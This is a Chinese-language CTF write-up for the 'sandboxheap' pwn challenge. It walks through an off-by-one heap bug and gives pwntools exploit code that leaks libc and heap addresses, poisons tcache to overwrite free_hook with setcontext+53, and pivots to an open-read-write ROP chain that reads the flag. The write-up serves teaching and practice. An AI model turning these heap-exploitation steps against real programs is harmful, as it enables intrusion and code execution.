# sandboxheap
### 程序分析
此题保护全开，还开了沙箱保护，只能通过ROW getflag  
有show函数可以得到堆中内容，有问题的地方是edit函数，存在off by one漏洞。  
![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/add.png)  
![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/edit.png)  
![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/ineidt.png)  
由于多读了一字节，可以覆盖下一个chunk的preinuse位。  
需要注意的是edit中会对输入做一定处理，根据每个字符是否是1进行判断，因此我的输入为01组成的字符串，该字符串会按每8个字符进行分割，逆序后组成一个字节。  
### 思路分析
决定使用unsortedbin unlink泄露libc地址、堆地址，得到free_hook地址，在free_hook处写下setcontext+53地址,，这样能在调用free时更改寄存器（rbp，rip）的值，用栈迁移劫持程序运行堆上布置好的orw rop链。  
这是我第一次使用setcontext相关内容，我们可以用gdb查看下里面的东西。  
![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/setcontext.png)  
发现在setcontext+53的地方有大量寄存器赋值的操作，使用pwntools的SigreturnFrame自动生成frame。  

接下来的大致思路都写在注释里了。  
```
for i in range(7):
    add(i, 0x88)  
add(7, 0x88)
add(8, 0x88)
add(9, 0x88)
add(14,0x190)#打算放orw rop，使程序栈迁移到它
add(15,0x190)#打算放SigreturnFrame，改变freehook为setcontext+53后free它就能更改寄存器的值
add(10, 0x10)
#填充tcache 0x90
for i in range(8):
    free(i)
overedit(8, b'1' * 0x80 + p64(0x120) , 0)#改变第9块的presize和preinuse，使其释放时把第8第7块一块合并了，实现堆块重叠，这样只要第8块中出现libc地址就能用show函数得到
```
![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/pic1.png)  
```
free(9)
add(11, 0x98)
add(12, 0x78)

#泄露libc
show(12)
p.recvuntil(b'Content: ')
libc_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
#泄露堆地址
add(0, 0x88)
edit(8,b'1'*8+p64(0x91))
free(12)
edit(8,b'1'*16)
show(8)
p.recvuntil(b'Content: ')
p.recvuntil(b'1'*16)
heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("heap_addr: ",hex(heap_addr))
edit(8,p64(0)+p64(91)+p64(free_hook))#改变tcache中第一个free chunk的fd指针为free_hook
```
![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/pic2.png)  
接下来只需要申请两次大小为0x90的chunk就能在free_hook上开辟chunk。  
```
add(1, 0x88)
add(2, 0x88)#index为2的堆开在了free_hook上，改变freehook为setcontext+53
edit(2,p64(setcontext+53))

frame = SigreturnFrame()
frame.rsp=heap_addr+0x2d0#对这个值的要求不高，但不写的话会变成0就出错了
frame.rbp=heap_addr+0x2d0
frame.rip = leave_ret
# edit()
byte_frame=bytes(frame)
# gdb.attach(p,'b free')
edit(1,b'./flag\x00')
#下面两种方法得到orwrop链都可以
#heap_addr+0x1c0为flag
#heap_addr+0x1f0为随便选的输出flag的地方
orw_payload=p64(0xdeadbeef)#rbp
if 1==0:
    orw_payload+=flat([pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
    orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,read_addr])
    orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,write_addr])
else:
    orw_payload+=flat([pop_rdi,heap_addr+0x1c0,pop_rsi,0,pop_rax,2,syscall])
    orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,pop_rax,0,syscall])
    orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x20,pop_rax,1,syscall])
edit(14,orw_payload)
edit(15,byte_frame)
free(15)#自动完成setcontext，然后执行orwrop链
```
![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/success.jpg)  

